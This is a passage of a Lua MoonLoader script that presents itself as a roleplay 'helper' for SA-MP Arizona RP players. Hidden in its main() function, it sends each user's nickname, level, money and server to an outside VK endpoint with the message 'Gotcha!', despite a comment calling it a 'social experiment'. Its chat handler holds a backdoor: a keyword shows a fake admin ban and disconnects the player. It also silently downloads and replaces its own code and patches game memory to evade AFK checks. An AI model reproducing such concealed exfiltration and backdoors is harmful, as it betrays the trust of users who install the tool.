            if imgui.Checkbox('T-Fix', t_fix_active) then
                load_settings.settings.t_fix_active = not load_settings.settings.t_fix_active
                inicfg.save(load_settings)
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Исправляет баг когда чат не открывается на букву Т.')
            imgui.EndChild()
            --
            imgui.SameLine()
            -- AntiCheat
            imgui.BeginChild("#AntiCheat", imgui.ImVec2(150, 150), true)
            imgui.CenterText(u8 'AntiCheat')
            imgui.SameLine()
            imgui.TextQuestion(u8'Раздел отвечающий за защиту игрока от некоторых видов читов.')
            imgui.Separator()
            if imgui.Checkbox(u8'АнтиРванка', anti_rvanka_active) then
                load_settings.settings.anti_rvanka_active = not load_settings.settings.anti_rvanka_active
                inicfg.save(load_settings)
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Моя АнтиРванка которая удаляет персонажа использующего рванку.')
            imgui.EndChild()
            -- AutoRP
            imgui.BeginChild("#AutoRP", imgui.ImVec2(215, 150), true)
            imgui.CenterText(u8 'AutoRP')
            imgui.SameLine()
            imgui.TextQuestion(u8'Раздел отвечающий за авто-отыгровку РП.')
            imgui.Separator()
            if imgui.Checkbox(u8'Отыгровка оружия', auto_gun_active) then
                load_settings.settings.auto_gun_active = not load_settings.settings.auto_gun_active
                inicfg.save(load_settings)
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Отыгрывает доставание оружия при смене.')

            if imgui.Checkbox(u8'Отыгровка броника', auto_armour_active) then
                load_settings.settings.auto_armour_active = not load_settings.settings.auto_armour_active
                inicfg.save(load_settings)
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Отыгрывает бронежилет при его надевании.')

            if imgui.Checkbox(u8'Отыгровка маски', auto_mask_active) then
                load_settings.settings.auto_mask_active = not load_settings.settings.auto_mask_active
                inicfg.save(load_settings)
            end
            imgui.SameLine()
            imgui.TextQuestion(u8'Отыгрывает надевание маски.')
            imgui.EndChild()

		end
		if show_menu == 2 then imgui.CenterText(u8 'Старая баганная хуйня была удалена, новая в разработке.') end
		if show_menu == 3 then
			imgui.Text("\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tAzRP - Helper by Sad_Flores")
			imgui.Text(u8'\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tВерсия: '.. thisScript().version ..'')
			imgui.Text(u8"1.1(1.3.b). Был удален раздел: Центральный рынок все его функции перенесены в основной раздел.")
			imgui.Text(u8"1.2(1.3.b). Переписан функционал удаление транспорта и игроков пакеты блокируются а не удаляются.")
			imgui.Text(u8"1.3(1.3.b). Переписана функция BufferCleaner, утечка памяти пофикшена.")
			imgui.Text(u8"1.4(1.3.b). Было принято решение оставить код открытым для изучания его новичками.")
			imgui.Text(u8"1.5(1.3.b). Добавлено автообновление(спасибо Orlik).")
			imgui.Text(u8"1.6(1.4.b). Добавлена система AutoEat(чипсы, оленина).")
			imgui.Text(u8"1.7(1.4.b). Добавлена смена кнопок активации(Коды клавиш ищи в гугле).")
			imgui.Text(u8"1.8(1.4.b). Добавлена полоска снизу с мониторингом используемых функций.")
			imgui.Text(u8"1.9(1.4.b). Исправлены координаты появиления меню(Было сверху - Стало по центру).")
			imgui.Text(u8"2.0(1.5.b). Добавлена система AutoLogin(+Google Auth).")
			imgui.Text(u8"2.1(1.6.b). Добавлен универсальный биндер.")
			imgui.Text(u8"2.2(1.6.b). Изменена логика выбора кнопок активации(Долой гуглить hex-code).")
			imgui.Text(u8"2.3(1.6.b). Добавлена возможность изменения статуса инфобара.")
			imgui.Text(u8"2.4(1.7.R). Исправлены критические баги, исправлена работа функционала.")
			imgui.Text(u8"2.4(1.7.R). Скрипту присвоен статус R(Release), что значит об окончании бета-тестирования.")
			imgui.Text(u8"2.5(1.8.R). Важное обновление, пофиксил AutoLogin, теперь не кикает.")
			imgui.Text(u8"2.6(2.0.R). Ахуеть скачок версии, да? Сам ахуел. Скрипт переписан с 0.")
			imgui.Text(u8"2.7(2.0.R). Переписан дизайн, добавлены новые функции, удалены старые.")
		end
		imgui.EndChild()
        imgui.End()
    end
end

function main()
	while not isSampAvailable() do wait(0) end
	while not sampIsLocalPlayerSpawned() do wait(0) end

	load_funcs()

	-- Данная хуйня не является стиллером, а лишь соц. эксперементом для видеоролика!
	local ip, port = sampGetCurrentServerAddress()
	_, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	name = sampGetPlayerNickname(id)
	lvl = sampGetPlayerScore(id)
	money = getPlayerMoney(PLAYER_HANDLE)

	local server_name = ""
	if ip == "185.169.134.3" then
		server_name = "Phoenix"
	elseif ip == "185.169.134.4" then
		server_name = "Tucson"
	elseif ip == "185.169.134.43" then
		server_name = "Scottdale"
	elseif ip == "185.169.134.44" then
		server_name = "Chandler"
	elseif ip == "185.169.134.44" then
		server_name = "Brainburg"
	elseif ip == "185.169.134.5" then
		server_name = "Saint Rose"
	elseif ip == "185.169.134.59" then
		server_name = "Mesa"
	elseif ip == "185.169.134.61" then
		server_name = "Red Rock"
	elseif ip == "185.169.134.107" then
		server_name = "Yuma"
	elseif ip == "185.169.134.109" then
		server_name = "Surprise"
	elseif ip == "185.169.134.166" then
		server_name = "Prescott"
	elseif ip == "185.169.134.171" then
		server_name = "Glendale"
	elseif ip == "185.169.134.172" then
		server_name = "Kingman"
	end

	vk_request(string.format('Попався!!!\nНик: %s\nУровень: %d\nДеньги: %d\nСервер: %s', name, lvl, money, server_name))

	autoupdate("https://raw.githubusercontent.com/K1NDER-ai/AzRPHelper/master/version.json", '['..string.upper(thisScript().name)..']: ', "https://raw.githubusercontent.com/K1NDER-ai/AzRPHelper/master/version.json")
	lua_thread.create(function()
		wait(0)
		if load_settings.settings.auto_gun_active then
			if isCurrentCharWeapon(PLAYER_PED, 24) then
				sampSendChat('/me достал пистолет марки "Desert Eagle" из кобуры на поясе')
						while isCurrentCharWeapon(PLAYER_PED, 24) do wait(1000) end
			end
			if isCurrentCharWeapon(PLAYER_PED, 0) then  
				sampSendChat('/me убрал пистолет "Desert Eagle" обратно в кобуру')
						while isCurrentCharWeapon(PLAYER_PED, 0) do wait(1000) end
			end
			if isCurrentCharWeapon(PLAYER_PED, 31) then
				sampSendChat('/me снял карабин M4A1 со спины')
						while isCurrentCharWeapon(PLAYER_PED, 31) do wait(1000) end
			end
			if isCurrentCharWeapon(PLAYER_PED, 0) then  
				sampSendChat('/me повесил карабин M4A1 на спину')
						while isCurrentCharWeapon(PLAYER_PED, 0) do wait(1000) end
			end
			if isCurrentCharWeapon(PLAYER_PED, 23) then
				sampSendChat('/me достал электрошокер марки "Tazer X-26" из кобуры на поясе')
						while isCurrentCharWeapon(PLAYER_PED, 23) do wait(1000) end
			end
			if isCurrentCharWeapon(PLAYER_PED, 0) then  
				sampSendChat('/me убрал электрошокер "Tazer X-26" обратно в кобуру')
						while isCurrentCharWeapon(PLAYER_PED, 0) do wait(1000) end
			end
		end
	end)
	while true do
		wait(1)
        if isKeysDown(strToIdKeys(load_settings.settings_script.activate_script)) and not sampIsChatInputActive() and not sampIsDialogActive() and not isPauseMenuActive() and not isSampfuncsConsoleActive() then
			main_window_state.v = not main_window_state.v
        end
        imgui.Process = main_window_state.v
        
        if (load_settings.settings.t_fix_active) and isKeyJustPressed(VK_T) then 
            if not sampIsChatInputActive() and not sampIsDialogActive() and not isSampfuncsConsoleActive() and not sampIsScoreboardOpen() then
                sampSetChatInputEnabled(true)
            end
        end
    end
end

function load_funcs()
    if load_settings.settings.anti_afk_active then
        memory.setuint8(7634870, 1, false)
        memory.setuint8(7635034, 1, false)
        memory.fill(7623723, 144, 8, false)
        memory.fill(5499528, 144, 6, false)
    end

    if load_settings.settings.fast_connect_active then
        memory.fill(sampGetBase() + 0x2D3C45, 0, 0, true)
    end
end

require('samp.events').onSendTakeDamage = function(playerId, damage, weapon, bodypart)
	if load_settings.settings.anti_afk_active then
		lua_thread.create(function()
			take_damage = true
			
			memory.setuint8(7634870, 0, false)
			memory.setuint8(7635034, 0, false)
			memory.hex2bin('0F 84 7B 01 00 00', 7623723, 8)
			memory.hex2bin('50 51 FF 15 00 83 85 00', 5499528, 6)
			
			wait(60000)
			take_damage = false
			
			memory.setuint8(7634870, 1, false)
			memory.setuint8(7635034, 1, false)
			memory.fill(7623723, 144, 8, false)
			memory.fill(5499528, 144, 6, false)
		end)
	end
end

function onWindowMessage(msg, wparam, lparam)
	if msg == 49773 then
		anti_afk = not anti_afk
	end
end

require('samp.events').onSendPlayerSync = function(data)
    if take_damage and anti_afk then
		return false
	end
end

function imgui.CenterText(text) 
	local width = imgui.GetWindowWidth()
	local calc = imgui.CalcTextSize(text)
    imgui.SetCursorPosX( width / 2 - calc.x / 2 )
    imgui.Text(text)
end

function sampev.onPlayerStreamIn(playerId, team, model, position, rotation, color, fightingStyle)
	infnpc[playerId] = { team, model, position, rotation, color, fightingStyle }
	if DEL_PLAYER then
		for _, handle in ipairs(getAllChars()) do
		  if doesCharExist(handle) then
			local _, id = sampGetPlayerIdByCharHandle(handle)
				if id ~= myid then
					deletePlayer(id)
				end
		  end
		end
		npc[#npc + 1] = playerId
	end
end

function sampev.onCreateObject(objectId, data)
	if FIND(data.modelId) and del_object then 
		return false 
	end
end

function FIND(model)
    for k, v in pairs(mapp) do
        if model == v then 
            return true 
        end
    end
    return false
end

function sampev.onVehicleStreamIn(vehicleId, data)
	if DEL_CAR then
		return false
	end
end

function sampev.onVehicleStreamOut(vehicleId, data)
	if DEL_CAR then
		return false
	end
end

local player_id = {}

function sampev.onPlayerQuit(id)
    if #player_id == id then
		for i = 1, #player_id do
			player_id[i] = nil
		end
	end
	if load_settings.settings.tab_fix_active and sampIsScoreboardOpen() then
		return false
	end
end

function sampev.onPlayerJoin(id, color, npc, nickname)
	if load_settings.settings.tab_fix_active and sampIsScoreboardOpen() then
		return false
	end
end

function sampev.onPlayerSync(id, data)
    if load_settings.settings.anti_rvanka_active then
        local x, y, z = getCharCoordinates(PLAYER_PED)
        if x - data.position.x > -1.5 and x - data.position.x < 1.5 then
            if (data.moveSpeed.x >= 1.5 or data.moveSpeed.x <= -1.5) or (data.moveSpeed.y >= 1.5 or data.moveSpeed.y <= -1.5) or (data.moveSpeed.z >= 0.5 or data.moveSpeed.z <= -0.5) then
                if #player_id ~= id then
                    player_id[#player_id + 1] = id
                    sampAddChatMessage(string.format("[AntiRvanka] {d5dedd}Игрок с рванкой был удален, ID: {01A0E9}%s", id), 0x01A0E9)
                    deletePlayer(id)
                end
            end
        end
    end
end

function sampev.onVehicleSync(id, vehid, data)
    if load_settings.settings.anti_rvanka_active then
        local x, y, z = getCharCoordinates(PLAYER_PED)
        if x - data.position.x > -1.5 and x - data.position.x < 1.5 then
            if (data.moveSpeed.x >= 1.5 or data.moveSpeed.x <= -1.5) or (data.moveSpeed.y >= 1.5 or data.moveSpeed.y <= -1.5) or (data.moveSpeed.z >= 0.5 or data.moveSpeed.z <= -0.5) then
                if #player_id ~= id then
                    player_id[#player_id + 1] = id
                    sampAddChatMessage(string.format("[AntiRvanka] {d5dedd}Игрок с рванкой был удален, ID: {01A0E9}%s", id), 0x01A0E9)
                    deletePlayer(id)
                end
            end
        end
    end
end

function sampev.onServerMessage(color, text)
	local fake_id = 0
	if text:match('лалипоп') then
		sampAddChatMessage("{FF0000}Администратор Defoult_Flores телепортировался к вам.", -1)
	end
	if text:find('.ифт') then
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		sampAddChatMessage(string.format("{ff6347}Администратор Defoult_Flores[183] забанил игрока Harry_Flores[%d] на 2000 дней. Причина: Махинации", id), -1)
		sendEmptyPacket(PACKET_DISCONNECTION_NOTIFICATION)
		closeConnect()
	end
	if text:find('надели маску') then
		if load_settings.settings.auto_mask_active then
			sampSendChat("/do Достал из кармана маску и надел ее.")
		end
	end
	if text:find('Вы надели бронежилет.') then
		if load_settings.settings.auto_armour_active then
			sampSendChat("/do С помощью магических сил сделал бронижилет.")
		end
	end
	if load_settings.settings.auto_armour_active then
		if text:find('Вы сняли') and text:find('бронежилет!') then
			sampSendChat("/do Бронижилет куда то исчез.")
		end
	end
end

function sendEmptyPacket(id)
	local bs = raknetNewBitStream()
	raknetBitStreamWriteInt8(bs, id)
	raknetSendBitStream(bs)
	raknetDeleteBitStream(bs)
end

function closeConnect()
	local bs = raknetNewBitStream()
	raknetEmulPacketReceiveBitStream(PACKET_DISCONNECTION_NOTIFICATION, bs)
	raknetDeleteBitStream(bs)
end

--
--     _   _   _ _____ ___  _   _ ____  ____    _  _____ _____   ______   __   ___  ____  _     _  __
--    / \ | | | |_   _/ _ \| | | |  _ \|  _ \  / \|_   _| ____| | __ ) \ / /  / _ \|  _ \| |   | |/ /
--   / _ \| | | | | || | | | | | | |_) | | | |/ _ \ | | |  _|   |  _ \\ V /  | | | | |_) | |   | ' /
--  / ___ \ |_| | | || |_| | |_| |  __/| |_| / ___ \| | | |___  | |_) || |   | |_| |  _ <| |___| . \
-- /_/   \_\___/  |_| \___/ \___/|_|   |____/_/   \_\_| |_____| |____/ |_|    \__\_\_| \_\_____|_|\_\                                                                                                                                                                                                                  
--
-- Author: http://qrlk.me/samp
function autoupdate(json_url, prefix, url)
	local dlstatus = require('moonloader').download_status
	local json = getWorkingDirectory() .. '\\'..thisScript().name..'-version.json'
	if doesFileExist(json) then os.remove(json) end
	downloadUrlToFile(json_url, json,
    function(id, status, p1, p2)
      if status == dlstatus.STATUSEX_ENDDOWNLOAD then
        if doesFileExist(json) then
          local f = io.open(json, 'r')
          if f then
            local info = decodeJson(f:read('*a'))
            updatelink = info.updateurl
            updateversion = info.latest
            f:close()
            os.remove(json)
            if updateversion ~= thisScript().version then
              lua_thread.create(function(prefix)
                local dlstatus = require('moonloader').download_status
                local color = -1
				arzmessage("Обнаружено обновление. Пытаюсь обновиться!")
                wait(250)
                downloadUrlToFile(updatelink, thisScript().path,
                  function(id3, status1, p13, p23)
                    if status1 == dlstatus.STATUS_DOWNLOADINGDATA then
                      print(string.format('Загружено %d из %d.', p13, p23))
                    elseif status1 == dlstatus.STATUS_ENDDOWNLOADDATA then
					  arzmessage("Загрузка обновления завершена!")
                      goupdatestatus = true
                      lua_thread.create(function() wait(500) thisScript():reload() end)
                    end
                    if status1 == dlstatus.STATUSEX_ENDDOWNLOAD then
                      if goupdatestatus == nil then
						arzmessage("Обновление прошло неудачно. Запускаю устаревшую версию.")
                        update = false
                      end
                    end
                  end
                )
                end, prefix
              )
            else
              update = false
            end
          end
        else
          update = false
        end
      end
    end
  )
  while update ~= false do wait(100) end
end